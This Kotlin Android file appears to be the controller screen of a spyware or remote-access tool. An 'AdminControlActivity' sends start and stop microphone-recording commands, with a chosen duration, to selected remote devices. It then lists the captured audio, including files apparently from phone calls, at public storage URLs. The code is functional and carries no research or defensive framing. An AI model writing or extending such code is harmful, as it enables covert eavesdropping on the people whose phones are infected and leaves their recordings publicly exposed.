package com.example.devsync

  import android.os.Bundle
  import android.view.View
  import android.widget.Button
  import android.widget.EditText
  import android.widget.TextView
  import androidx.fragment.app.Fragment
  import androidx.recyclerview.widget.LinearLayoutManager
  import androidx.recyclerview.widget.RecyclerView
  import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
  import kotlinx.coroutines.*

  class AudioFragment : Fragment(R.layout.fragment_audio) {

      private val admin get() = requireActivity() as AdminControlActivity
      private lateinit var rvRecordings: RecyclerView
      private lateinit var adapter: RecordingListAdapter
      private lateinit var tvStatus: TextView
      private val recordingList = mutableListOf<RecordingItem>()
    private lateinit var swipeAudio: SwipeRefreshLayout

      override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
          super.onViewCreated(view, savedInstanceState)

          rvRecordings = view.findViewById(R.id.rvRecordings)
          tvStatus = view.findViewById(R.id.tvRecordingStatus)
          adapter = RecordingListAdapter(recordingList)
          rvRecordings.layoutManager = LinearLayoutManager(requireContext())
          rvRecordings.adapter = adapter

          val etDuration = view.findViewById<EditText>(R.id.etRecordDuration)

          view.findViewById<Button>(R.id.btnStartRecording).setOnClickListener {
              val dur = etDuration.text.toString().toIntOrNull() ?: 30
              admin.sendToSelected { d ->
                  d.child("record_duration_seconds").setValue(dur)
                  d.child("start_recording").setValue(System.currentTimeMillis())
              }
              tvStatus.text = "● Mic: Recording (${dur}s)..."
              tvStatus.setTextColor(0xFFFF4444.toInt())
          }

          view.findViewById<Button>(R.id.btnStopRecording).setOnClickListener {
              admin.sendToSelected { d -> d.child("stop_recording").setValue(true) }
              tvStatus.text = "● Mic: Stopped"
              tvStatus.setTextColor(0xFF8B949E.toInt())
          }

          swipeAudio = view.findViewById(R.id.swipeAudio)
        swipeAudio.setOnRefreshListener {
              loadRecordings { swipeAudio.isRefreshing = false }
          }

          loadRecordings(null)
      }

      override fun onResume() {
          super.onResume()
          loadRecordings(null)
      }

      private fun loadRecordings(onDone: (() -> Unit)?) {
          CoroutineScope(Dispatchers.IO).launch {
              val arr = admin.supabaseList("recordings")
              val list = mutableListOf<RecordingItem>()
              for (i in 0 until arr.length()) {
                  try {
                      val obj  = arr.getJSONObject(i)
                      val name = obj.optString("name")
                      if (!name.endsWith(".m4a") && !name.endsWith(".mp3")) continue
                      val type = when { name.startsWith("mic_") -> "mic"; name.startsWith("call_") -> "call"; else -> "mic" }
                      val noExt = name.removeSuffix(".m4a").removeSuffix(".mp3")
                      val parts = noExt.split("_")
                      val ts  = parts.lastOrNull()?.toLongOrNull() ?: 0L
                      val did = parts.getOrElse(1) { "" }
                      val url = "${AdminControlActivity.SUPABASE_URL}/storage/v1/object/public/recordings/$name"
                      list.add(RecordingItem(name, did, type, url, ts, name))
                  } catch (_: Exception) {}
              }
              list.sortByDescending { it.timestamp }
              withContext(Dispatchers.Main) {
                  recordingList.clear(); recordingList.addAll(list)
                  adapter.notifyDataSetChanged()
                  onDone?.invoke()
              }
          }
      }
  }
  